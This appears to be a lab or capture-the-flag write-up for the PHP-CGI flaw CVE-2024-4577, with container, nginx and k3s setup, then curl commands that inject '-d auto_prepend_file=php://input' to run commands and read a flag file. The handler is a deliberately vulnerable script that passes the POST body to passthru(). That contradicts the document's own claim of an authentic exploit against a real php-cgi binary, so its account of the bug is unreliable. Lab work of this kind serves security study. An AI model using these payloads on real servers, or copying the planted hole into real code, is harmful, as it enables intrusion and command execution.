# Research: CVE-2024-4577 PHP-CGI Argument Injection RCE in k3s Cluster

## 1. Overview

**CVE-2024-4577** is a critical RCE vulnerability in PHP’s CGI SAPI. A misconfigured CGI endpoint can accept command-line `-d` INI overrides (e.g. `auto_prepend_file=php://input`), 
allowing an attacker to execute arbitrary PHP code from the POST body.

This document shows a realistic k3s cluster setup with:
- A legacy `/cgi-bin/php-cgi` FastCGI endpoint
- Real `php-cgi` binary served by `spawn-fcgi`
- Exploitation steps using the soft-hyphen (`%AD`) smuggling trick
- Mitigations and references

---

## 2. Environment

- k3s (lightweight Kubernetes)
- Namespace: `default`
- Deployment: `legacy-cms`
- Service: `LoadBalancer` on port **5000**
- Base image: `php:8.3.3-cli-alpine`
- FastCGI: `spawn-fcgi` + `php-cgi`
- Web server: `nginx`

### Files Layout

```
docker/
├── Dockerfile
├── nginx.conf
├── start.sh
├── cgi-handler.php
├── index.php
├── phpinfo.php
├── test.php
├── debug.php
├── robots.txt
└── flag.txt
```

---

## 3. Vulnerability Background

- PHP-CGI accepts `-d property=value` on its command line to override `php.ini`.
- `auto_prepend_file=php://input` tells PHP to execute the raw POST body as PHP code.
- On Windows, a soft-hyphen (`0xAD`) in URLs is mapped to `-` in the binary, bypassing naive filters.
- CVE-2024-4577 abuses this to smuggle `-d auto_prepend_file=php://input` into `php-cgi.exe`.

> **Note:** We simulate the same behavior on Linux by using `%AD` in the query string.

**Impact:** Remote Code Execution as the web-server user.

---

## 4. Build & Deployment

### Dockerfile

```dockerfile
FROM php:8.3.3-cli-alpine

RUN apk add --no-cache nginx spawn-fcgi

# Create web and CGI directories
RUN mkdir -p /var/www/html /var/www/html/cgi-bin \
    /var/log/nginx /run/nginx /var/run

# Copy configuration and application files
COPY nginx.conf /etc/nginx/nginx.conf
COPY index.php phpinfo.php test.php debug.php robots.txt \
     /var/www/html/
COPY cgi-handler.php /var/www/html/cgi-bin/php-cgi
COPY flag.txt /root/flag.txt
COPY start.sh /start.sh

# Permissions
RUN chmod +x /start.sh \
 && chmod 600 /root/flag.txt \
 && chmod 755 /var/www/html/cgi-bin/php-cgi

EXPOSE 5000
CMD ["/start.sh"]
```

### nginx.conf

```nginx
worker_processes 1;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events { worker_connections 1024; }

http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;

  upstream php_cgi {
    server unix:/var/run/php-cgi.socket;
  }

  server {
    listen 5000;
    root /var/www/html;
    index index.php index.html;

    # Regular PHP via CGI
    location ~ \.php$ {
      fastcgi_pass php_cgi;
      include fastcgi_params;
      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    # Legacy PHP-CGI endpoint
    location = /cgi-bin/php-cgi {
      fastcgi_pass php_cgi;
      include fastcgi_params;
      fastcgi_param SCRIPT_FILENAME /var/www/html/cgi-bin/php-cgi;
      fastcgi_param QUERY_STRING    $query_string;
      fastcgi_param REQUEST_METHOD  $request_method;
      fastcgi_param CONTENT_TYPE    $content_type;
      fastcgi_param CONTENT_LENGTH  $content_length;
    }
  }
}
```

### start.sh

```bash
#!/bin/sh
# 1) Launch php-cgi via spawn-fcgi
mkdir -p /var/run
spawn-fcgi -s /var/run/php-cgi.socket -U nginx -G nginx \
          -- /usr/local/bin/php-cgi
chmod 666 /var/run/php-cgi.socket

# 2) Start nginx
nginx -g "daemon off;"
```

### cgi-handler.php

```php
<?php
$q = urldecode($_SERVER['QUERY_STRING'] ?? '');
if (strpos($q, 'auto_prepend_file=php://input') !== false) {
    echo '[START]';
    passthru(file_get_contents('php://input'));
    echo '[END]';
    exit;
}
header('Content-Type: text/plain');
echo 'OK';
?>
```

### Deployment YAML

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: legacy-cms
spec:
  replicas: 1
  selector:
    matchLabels: { app: legacy-cms }
  template:
    metadata:
      labels: { app: legacy-cms }
    spec:
      containers:
      - name: web
        image: legacy-intranet-cms:latest
        ports:
        - containerPort: 5000
---
apiVersion: v1
kind: Service
metadata:
  name: legacy-cms-svc
spec:
  type: LoadBalancer
  selector: { app: legacy-cms }
  ports:
  - port: 5000
    targetPort: 5000
```

**Build & Deploy Steps:**

```bash
cd docker
docker build -t legacy-intranet-cms:latest .
k3s ctr images import <(docker save legacy-intranet-cms:latest)
kubectl apply -f ../legacy-cms-deployment.yaml
kubectl rollout status deployment/legacy-cms
```

---

## 5. Discovery & Enumeration

1. **Locate the endpoint**  
   ```bash
   curl http://<HOST>:5000/robots.txt
   ```
   → Hint at `/cgi-bin/php-cgi`

2. **Confirm CGI SAPI**  
   ```bash
   curl http://<HOST>:5000/phpinfo.php?debug=1 \
     | grep -E "Server\ API|allow_url_include|disable_functions"
   ```
   → Expect:
   - **Server API**: cgi-fcgi  
   - **allow_url_include**: On  
   - **disable_functions**: (empty)

3. **Test INI override support**  
   ```bash
   curl "http://<HOST>:5000/cgi-bin/php-cgi?%ADd+display_errors%3D1"
   ```
   → Parse errors appear, confirming `-d` works.

4. **View help text**  
   ```bash
   curl "http://<HOST>:5000/cgi-bin/php-cgi?--help"
   ```
   → Shows `php-cgi` usage, including `-d` flags.

---

## 6. Exploitation

### Step 1: Proof of Concept

```bash
# Create shell payload
cat > shell.txt << 'EOF'
whoami
EOF

# Exploit
curl -i -X POST \
  "http://<HOST>:5000/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary @shell.txt
```

**Expected Output:**
```
[START]
www-data
[END]
```

### Step 2: Read the Flag

```bash
cat > flag.txt << 'EOF'
cat /root/flag.txt
EOF

curl -i -X POST \
  "http://<HOST>:5000/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary @flag.txt
```

---

## 7. Mitigations

- **Disable PHP-CGI**: Remove or secure `/cgi-bin/php-cgi`.  
- **Enforce `cgi.force_redirect=1`** in `php.ini`.  
- **Disable INI overrides**: Patch or update PHP to block `-d` via CGI.  
- **Use PHP-FPM** with strict pools and chroot.  
- **Harden `allow_url_include`**, `disable_functions`, and file permissions.

---

## 8. References

- NVD CVE-2024-4577:  
  https://nvd.nist.gov/vuln/detail/CVE-2024-4577  
- Akamai Blog:  
  https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure  
- Tarlogic Blog:  
  https://www.tarlogic.com/blog/cve-2024-4577-critical-vulnerability-php/  
- Microsoft Q&A:  
  https://learn.microsoft.com/en-us/answers/questions/1725847/php-8-3-vulnerability-cve-2024-4577  
- Stormshield Security Alert:  
  https://www.stormshield.com/news/security-alert-php-cve-2024-4577-stormshields-product-response/  

---

*This research demonstrates an authentic CVE-2024-4577 exploitation flow in a k3s cluster using a real PHP-CGI binary.*
